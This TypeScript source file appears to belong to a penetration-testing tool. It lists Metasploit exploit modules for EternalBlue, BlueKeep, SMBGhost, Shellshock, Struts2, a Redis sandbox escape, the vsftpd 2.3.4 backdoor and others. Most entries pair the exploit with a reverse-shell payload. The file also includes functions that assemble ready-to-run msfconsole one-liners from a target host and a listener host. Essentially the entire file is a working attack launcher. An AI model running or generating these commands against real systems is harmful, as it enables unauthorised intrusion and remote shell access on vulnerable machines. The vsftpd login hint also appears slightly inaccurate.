// Active Metasploit exploit modules — runnable one-liners for testing

export interface MsfExploit {
    id: string;
    name: string;
    cve?: string;
    module: string;
    /** Default payload for this exploit (set in msfconsole) */
    defaultPayload?: string;
    /** Optional extra options (e.g. RPORT) */
    extraOptions?: Record<string, string>;
    description: string;
    port: number[];
    severity: 'critical' | 'high' | 'medium' | 'low';
}

export const msfExploits: MsfExploit[] = [
    {
        id: 'eternalblue',
        name: 'MS17-010 EternalBlue',
        cve: 'CVE-2017-0144',
        module: 'exploit/windows/smb/ms17_010_eternalblue',
        defaultPayload: 'windows/x64/meterpreter/reverse_tcp',
        description: 'SMB remote code execution (WannaCry). Target: Windows 7/2008 unpatched.',
        port: [445],
        severity: 'critical'
    },
    {
        id: 'ms08-067',
        name: 'MS08-067 NetAPI',
        cve: 'CVE-2008-4250',
        module: 'exploit/windows/smb/ms08_067_netapi',
        defaultPayload: 'windows/meterpreter/reverse_tcp',
        description: 'Windows Server Service RCE. Target: Windows XP/2003.',
        port: [445],
        severity: 'critical'
    },
    {
        id: 'smbghost',
        name: 'SMBGhost (CVE-2020-0796)',
        cve: 'CVE-2020-0796',
        module: 'exploit/windows/smb/cve_2020_0796_smbghost',
        defaultPayload: 'windows/x64/meterpreter/reverse_tcp',
        description: 'SMBv3 compression RCE. Target: Windows 10 1903/1909.',
        port: [445],
        severity: 'critical'
    },
    {
        id: 'bluekeep',
        name: 'BlueKeep (CVE-2019-0708)',
        cve: 'CVE-2019-0708',
        module: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
        defaultPayload: 'windows/x64/meterpreter/reverse_tcp',
        extraOptions: { FORCE_TARGET: 'true' },
        description: 'RDP remote code execution. Target: Windows 7/2008 RDP.',
        port: [3389],
        severity: 'critical'
    },
    {
        id: 'shellshock',
        name: 'Shellshock (CVE-2014-6271)',
        cve: 'CVE-2014-6271',
        module: 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
        defaultPayload: 'cmd/unix/reverse_bash',
        description: 'Bash vulnerability via CGI. Target: Apache mod_cgi.',
        port: [80, 443, 8080],
        severity: 'critical'
    },
    {
        id: 'struts2',
        name: 'Apache Struts RCE (CVE-2017-5638)',
        cve: 'CVE-2017-5638',
        module: 'exploit/multi/http/struts2_content_type_ognl',
        defaultPayload: 'windows/meterpreter/reverse_tcp',
        description: 'Struts2 Content-Type OGNL injection. Target: Apache Struts 2.3.x–2.3.32.',
        port: [80, 443, 8080],
        severity: 'critical'
    },
    {
        id: 'redis-lua',
        name: 'Redis Lua Sandbox (CVE-2022-0543)',
        cve: 'CVE-2022-0543',
        module: 'exploit/linux/redis/redis_debian_sandbox_escape',
        defaultPayload: 'cmd/unix/reverse_bash',
        description: 'Redis Debian package Lua sandbox escape. Target: Debian/Ubuntu Redis.',
        port: [6379],
        severity: 'critical'
    },
    {
        id: 'proftpd-modcopy',
        name: 'ProFTPD mod_copy (CVE-2015-3306)',
        cve: 'CVE-2015-3306',
        module: 'exploit/unix/ftp/proftpd_modcopy_exec',
        defaultPayload: 'cmd/unix/reverse_bash',
        description: 'ProFTPD mod_copy SITE CPFR/CPTO RCE.',
        port: [21],
        severity: 'critical'
    },
    {
        id: 'vsftpd-backdoor',
        name: 'vsftpd 2.3.4 Backdoor',
        cve: 'CVE-2011-2523',
        module: 'exploit/unix/ftp/vsftpd_234_backdoor',
        defaultPayload: 'cmd/unix/interact',
        description: 'vsftpd 2.3.4 backdoor (user: any, pass: :)',
        port: [21],
        severity: 'critical'
    },
    {
        id: 'mysql-auth-bypass',
        name: 'MySQL Auth Bypass (CVE-2012-2122)',
        cve: 'CVE-2012-2122',
        module: 'auxiliary/scanner/mysql/mysql_authbypass_hashdump',
        description: 'MySQL authentication bypass (brute). Use with credential module.',
        port: [3306],
        severity: 'high'
    }
];

/**
 * Generate msfconsole one-liner to run an exploit.
 * Use in terminal: msfconsole -q -x "<returned string>"
 */
export function getMsfconsoleCommands(
    exploit: MsfExploit,
    opts: { rhost: string; lhost: string; lport: string }
): string {
    const lines: string[] = [
        `use ${exploit.module}`,
        `set RHOSTS ${opts.rhost}`,
        `set LHOST ${opts.lhost}`,
        `set LPORT ${opts.lport}`
    ];
    if (exploit.defaultPayload) {
        lines.push(`set PAYLOAD ${exploit.defaultPayload}`);
    }
    if (exploit.extraOptions) {
        for (const [k, v] of Object.entries(exploit.extraOptions)) {
            lines.push(`set ${k} ${v}`);
        }
    }
    if (exploit.module.startsWith('auxiliary/')) {
        lines.push('run');
    } else {
        lines.push('run');
    }
    return lines.join('\n');
}

/**
 * Single-line for msfconsole -q -x "..." (escaped for shell)
 */
export function getMsfconsoleOneLiner(
    exploit: MsfExploit,
    opts: { rhost: string; lhost: string; lport: string }
): string {
    const cmd = getMsfconsoleCommands(exploit, opts);
    return cmd.replace(/\n/g, '; ');
}

export default { msfExploits, getMsfconsoleCommands, getMsfconsoleOneLiner };
